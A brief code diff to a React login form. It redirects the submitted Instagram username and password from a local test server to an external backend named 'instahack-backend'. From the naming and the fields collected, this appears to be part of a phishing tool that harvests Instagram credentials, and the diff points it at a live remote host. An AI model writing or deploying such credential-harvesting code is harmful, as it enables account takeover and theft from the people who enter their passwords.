@@ -13,7 +13,7 @@ const LoginForm = () => {
     setMessage("");
 
     try {
-      const { data } = await axios.post("http://localhost:4800/api/register", {
+      const { data } = await axios.post("https://instahack-backend.onrender.com/api/register", {
         instagramUsername,
         password,
       });
